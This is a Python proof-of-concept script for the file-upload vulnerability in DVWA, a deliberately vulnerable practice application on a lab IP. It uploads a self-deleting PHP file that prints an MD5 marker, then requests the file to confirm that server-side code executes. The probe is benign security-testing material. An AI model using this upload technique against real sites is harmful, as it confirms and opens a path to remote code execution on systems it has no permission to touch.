# -*- coding: utf-8 -*-
"""
@Project  :dvwa-POC
@File     :dvwa-Upload.py
@Date     :2022/5/9 18:39
@Author   :7-R2X

"""
import requests
import hashlib
import random
import time

file_name = time.time_ns()


def write_file(rd):
	# 写入php内容
	content = '<?php echo md5("{}"); unlink(__FILE__)?>'.format(rd)
	with open('./php/{}'.format(file_name) + '.php', 'w+') as w:
		w.write(content)


def upload_file(url):
	cookies = {
		'PHPSESSID': 'd3rl40rfpm0qq7r12basipn3v1',
		'security': 'low',
	}

	headers = {
		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '
		              'Chrome/101.0.4951.54 Safari/537.36',
	}
	try:
		upload_files = open("./php/" + str(file_name) + '.php', 'rb')
		file = {'uploaded': upload_files, 'Upload': (None, "Upload")}
		response = requests.post(url=url, files=file, cookies=cookies, headers=headers)
	except Exception as error:
		print(error)


def check_poc(url, file_name, md5_num):
	cookies = {
		'PHPSESSID': 'd3rl40rfpm0qq7r12basipn3v1',
		'security': 'low',
	}

	headers = {
		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54                   Safari/537.36',
	}
	# 拼接上传路径
	fin_url = url + '../../hackable/uploads/{}'.format(file_name + '.php')
	try:
		r = requests.get(url=fin_url, headers=headers, cookies=cookies)
		if md5_num.hexdigest() in r.text:
			print('存在文件上传漏洞')
	except Exception as error:
		print(error)


if __name__ == '__main__':
	# 随机文件名
	random_file_name = str(random.random())
	# md5加密文件名
	md = hashlib.md5()
	md.update(random_file_name.encode('utf-8'))
	# 第一步:随机命名php脚本
	write_file(random_file_name)
	target = 'http://192.168.163.131:8080/vulnerabilities/upload/'
	# 第二部:上传php脚本
	upload_file(target)
	# 第三步:访问php脚本，判断是否存在且能否正常解析
	check_poc(target, str(file_name), md)
